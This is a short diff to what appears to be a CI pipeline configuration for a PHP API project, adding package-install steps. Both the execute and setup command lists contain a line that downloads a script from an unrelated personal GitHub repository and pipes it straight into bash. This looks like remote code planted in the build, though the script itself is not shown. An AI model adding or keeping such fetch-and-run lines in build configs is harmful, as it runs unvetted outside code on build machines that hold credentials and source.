@@ -10,8 +10,10 @@
       docker_image_name: "library/php"
       docker_image_tag: "8.0.9"
       execute_commands:
+        - "apt update && apt -y install git wget"
         - "curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var | bash"
       setup_commands:
+        - "apt update && apt -y install git wget"
         - "curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var | bash"
       mount_filesystem_path: "/buddy/buddy-works-php-api"
       shell: "BASH"
